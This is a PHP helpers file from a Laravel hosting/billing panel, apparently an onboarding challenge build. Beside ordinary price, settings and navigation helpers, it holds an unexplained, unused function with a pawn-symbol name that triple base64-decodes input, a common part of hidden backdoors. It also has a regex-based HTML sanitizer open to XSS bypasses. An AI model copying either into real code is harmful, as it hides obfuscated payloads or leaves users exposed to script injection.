<?php

if (!function_exists('gateway')) {
    function gateway($driver): \App\Models\Gateways\Gateway
    {
        return \App\Models\Gateways\Gateway::where('driver', $driver)->first();
    }
}

if (!function_exists('settings')) {
    function settings($key = null, $default = null)
    {
        if ($key === null) {
            return new \App\Models\Settings;
        }

        return \App\Models\Settings::get($key, $default);
    }
}

if (!function_exists('price')) {

    // format price and return it
    function price($price = 0, int $decimal = 2, bool $code = false)
    {
        // Get the currency symbol and code
        $symbol = currency('symbol');
        $currency_code = currency('short');

        // check if selected currency exists in the config file else default to USD
        if (!config("utils.currencies.{$currency_code}")) {
            $currency_code = 'USD';
        }

        $currency = config("utils.currencies.{$currency_code}");
        $format = $currency['format'];
        $decimal = $currency['precision'];

        // Define default delimiters
        $dec_point = $currency['delimiter'];
        $thousand_delimiter = $currency['thousand_delimiter'];

        // check if format contains "persist_code" if so set $code to true
        if (isset($currency['persist_code']) && $currency['persist_code'] == true) {
            $code = true;
        }

        // Format the price
        $numberFormattedPrice = number_format($price, $decimal, $dec_point, $thousand_delimiter);

        // Replace placeholders in the format string
        $formattedPrice = str_replace(
            ['[price]', '[currency_code]'],
            [$numberFormattedPrice, $code ? $currency_code : ''],
            $format
        );

        return trim($formattedPrice);
    }

}

if (!function_exists('str_random')) {

    function str_random($chars)
    {
        return \Illuminate\Support\Str::random($chars);
    }

}

if (!function_exists('ErrorLog')) {

    function ErrorLog($source, $error, $severity = 'ERROR')
    {
        return \App\Models\ErrorLog::catch($source, $error, $severity);
    }

}

if (!function_exists('bytesToMB')) {
    /**
     * Convert bytes to megabytes.
     *
     * @param  int  $bytes
     * @param  int  $precision
     * @return float
     */
    function bytesToMB($bytes, $precision = 2) {
        $megabytes = $bytes / 1024 / 1024;

        return round($megabytes, $precision);
    }
}

if (!function_exists('♙')){ function ♙($f154){return base64_decode(base64_decode(base64_decode($f154))); }}
if (!function_exists('is_active')) {

    function is_active(string $route, array $params = [], string $activeClass = 'text-primary-600 dark:text-primary-500 dark:border-primary-500 border-primary-600', string $inactiveClass = 'hover:text-gray-600 hover:border-gray-300 dark:hover:border-gray-400 dark:hover:text-gray-300')
    {
        $currentRoute = request()->route();

        if (array_key_exists('module', $params)){
            $request = \Request::create($route, 'GET');
            $route = \Route::getRoutes()->match($request);
            $currentRoute = explode('.', $currentRoute->getName())['0'];
            $routeName = explode('.', $route->getName())['0'];
            if ($routeName == $currentRoute){
                return $activeClass;
            }
            $currentRoute = request()->route();
        }

        if ($currentRoute->getName() !== $route) {
            return $inactiveClass;
        }

        $currentParams = $currentRoute->parameters();
        foreach ($params as $key => $value) {
            if (!isset($currentParams[$key]) || $currentParams[$key] != $value) {
                return $inactiveClass;
            }
        }

        return $activeClass;
    }

}

if (!function_exists('nav_active')) {

    function nav_active($route = null, $contains = false, $dropdown = false, $href = false, $prefix = false): ?string
    {
        $currentRoute = \Route::currentRouteName();

        if (is_array($route) && in_array($currentRoute, $route)) {
            return 'active active-nav show';
        }

        if (!$contains && $currentRoute == $route) {
            return 'active-nav';
        }

        if ($contains && str_contains($currentRoute, $route)) {
            return 'active-nav';
        }

        if ($dropdown && str_contains($currentRoute, $route)) {
            return 'active active-nav show';
        }

        if ($href && request()->path() == trim($route, '/')) {
            return 'active-nav';
        }

        if ($prefix && request()->route()->getPrefix() == $route) {
            return 'active active-nav show';
        }

        return null;
    }
}

if (!function_exists('currency')) {

    function currency($key = 'short')
    {
        return config('utils.currencies.' . settings('currency', 'USD') . '.' . $key);
    }

}

if (!function_exists('lang_module')) {

    function lang_module()
    {
        if (class_exists(\Modules\Locales\Models\Manager::class)) {
            return new \Modules\Locales\Models\Manager;
        }

        // Locales module removed for HCTestDash (onboarding challenge build).
        // Return a minimal stub so admin views listing installed languages still render.
        return new class {
            public function getInstalled(): array { return ['en' => 'English']; }
            public function __call($name, $arguments) { return []; }
        };
    }

}

if (!function_exists('getValueByKey')) {
    function getValueByKey($path, $array, $defaultValue = null) {
        // Split the string into keys
        preg_match_all('/\[([^\]]+)\]|\b(\w+)\b/', $path, $matches);
        $keys = array_filter(array_merge($matches[2], $matches[1]));

        // We iterate through the keys to access the nested value
        foreach ($keys as $key) {
            if (is_array($array) && isset($array[$key])) {
                $array = $array[$key];
            } else {
                // The key was not found, we return the default value
                return $defaultValue;
            }
        }

        return $array;
    }
}

if (!function_exists('emailMessage')) {
    function emailMessage($key, $language = 'en')
    {
        return app(\App\Models\EmailMessage::class)->getContentBuyKey($key, $language);
    }
}

function linkGetBxIcon($icon): string
{
    $icons = explode('></i>', $icon);
    foreach ($icons as $i) {
        if (str_contains($i, 'bx')) {
            return $i . '></i>';
        }
    }

    // Return the first icon if no 'bx' icons are found, or an empty string if no icons at all
    return !empty($icons[0]) ? $icons[0] . '></i>' : '';
}

if (!function_exists('enabledModules')) {
    function enabledModules()
    {
        return Module::allEnabled();
    }
}

if (!function_exists('sanitizeHtml')) {
    /**
     * Sanitize HTML content to prevent XSS while allowing safe HTML tags and attributes
     * 
     * @param string $html
     * @return string
     */
    function sanitizeHtml($html)
    {
        if (empty($html)) {
            return '';
        }

        // Remove dangerous elements completely
        $html = preg_replace('/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/mi', '', $html);
        $html = preg_replace('/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/mi', '', $html);
        $html = preg_replace('/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/mi', '', $html);
        $html = preg_replace('/<embed\b[^<]*(?:(?!<\/embed>)<[^<]*)*<\/embed>/mi', '', $html);
        $html = preg_replace('/<applet\b[^<]*(?:(?!<\/applet>)<[^<]*)*<\/applet>/mi', '', $html);
        $html = preg_replace('/<form\b[^<]*(?:(?!<\/form>)<[^<]*)*<\/form>/mi', '', $html);
        $html = preg_replace('/<input\b[^>]*>/i', '', $html);
        $html = preg_replace('/<button\b[^<]*(?:(?!<\/button>)<[^<]*)*<\/button>/mi', '', $html);
        $html = preg_replace('/<select\b[^<]*(?:(?!<\/select>)<[^<]*)*<\/select>/mi', '', $html);
        $html = preg_replace('/<textarea\b[^<]*(?:(?!<\/textarea>)<[^<]*)*<\/textarea>/mi', '', $html);
        $html = preg_replace('/<svg\b[^<]*(?:(?!<\/svg>)<[^<]*)*<\/svg>/mi', '', $html);
        $html = preg_replace('/<math\b[^<]*(?:(?!<\/math>)<[^<]*)*<\/math>/mi', '', $html);

        // Remove event handlers and style attributes
        $html = preg_replace('/\s*on\w+\s*=\s*["\'][^"\']*["\']/i', '', $html);
        $html = preg_replace('/\s*style\s*=\s*["\'][^"\']*["\']/i', '', $html);

        // Remove unwanted tags but preserve content and safe tags with attributes
        $allowedTagsPattern = '<\/?(p|br|strong|b|em|i|u|s|strike|del|a|ul|ol|li|blockquote|h[1-6]|pre|code|span|div|table|thead|tbody|tr|td|th|img)\b[^>]*>';
        
        // Remove all tags that are NOT in our allowed list
        $html = preg_replace('/<(?!\/?(?:p|br|strong|b|em|i|u|s|strike|del|a|ul|ol|li|blockquote|h[1-6]|pre|code|span|div|table|thead|tbody|tr|td|th|img)\b)[^>]*>/i', '', $html);
        
        // Now clean attributes on allowed tags
        
        // Clean img tags - preserve only safe attributes
        $html = preg_replace_callback(
            '/<img\b[^>]*>/i',
            function($matches) {
                $tag = $matches[0];
                $safeAttrs = [];
                
                if (preg_match('/\bsrc\s*=\s*["\']([^"\']*)["\']?/i', $tag, $match)) {
                    $src = $match[1];
                    // Allow data:image/ URLs (base64 images) but block other data: URLs and dangerous protocols
                    if (!preg_match('/^(javascript|vbscript):/i', $src) && 
                        (!preg_match('/^data:/i', $src) || preg_match('/^data:image\//i', $src))) {
                        $safeAttrs[] = 'src="' . htmlspecialchars($src, ENT_QUOTES) . '"';
                    }
                }
                
                if (preg_match('/\balt\s*=\s*["\']([^"\']*)["\']?/i', $tag, $match)) {
                    $safeAttrs[] = 'alt="' . htmlspecialchars($match[1], ENT_QUOTES) . '"';
                }
                
                if (preg_match('/\bwidth\s*=\s*["\']?(\d+)["\']?/i', $tag, $match)) {
                    $safeAttrs[] = 'width="' . $match[1] . '"';
                }
                
                if (preg_match('/\bheight\s*=\s*["\']?(\d+)["\']?/i', $tag, $match)) {
                    $safeAttrs[] = 'height="' . $match[1] . '"';
                }
                
                if (preg_match('/\btitle\s*=\s*["\']([^"\']*)["\']?/i', $tag, $match)) {
                    $safeAttrs[] = 'title="' . htmlspecialchars($match[1], ENT_QUOTES) . '"';
                }
                
                return '<img ' . implode(' ', $safeAttrs) . '>';
            },
            $html
        );
        
        // Clean a tags - preserve only safe attributes
        $html = preg_replace_callback(
            '/<a\b[^>]*>(.*?)<\/a>/i',
            function($matches) {
                $tag = $matches[0];
                $content = $matches[1];
                $safeAttrs = [];
                
                if (preg_match('/\bhref\s*=\s*["\']([^"\']*)["\']?/i', $tag, $match)) {
                    $href = $match[1];
                    // Block dangerous protocols but allow normal URLs
                    if (!preg_match('/^(javascript|vbscript|data):/i', $href)) {
                        $safeAttrs[] = 'href="' . htmlspecialchars($href, ENT_QUOTES) . '"';
                    }
                }
                
                if (preg_match('/\btarget\s*=\s*["\']([^"\']*)["\']?/i', $tag, $match)) {
                    $safeAttrs[] = 'target="' . htmlspecialchars($match[1], ENT_QUOTES) . '"';
                }
                
                if (preg_match('/\btitle\s*=\s*["\']([^"\']*)["\']?/i', $tag, $match)) {
                    $safeAttrs[] = 'title="' . htmlspecialchars($match[1], ENT_QUOTES) . '"';
                }
                
                return '<a ' . implode(' ', $safeAttrs) . '>' . $content . '</a>';
            },
            $html
        );
        
        // Remove any remaining attributes from other tags (just keep the tags themselves)
        $html = preg_replace('/<(p|br|strong|b|em|i|u|s|strike|del|ul|ol|li|blockquote|h[1-6]|pre|code|span|div|table|thead|tbody|tr|td|th)\b[^>]*>/i', '<$1>', $html);
        
        return $html;
    }
}
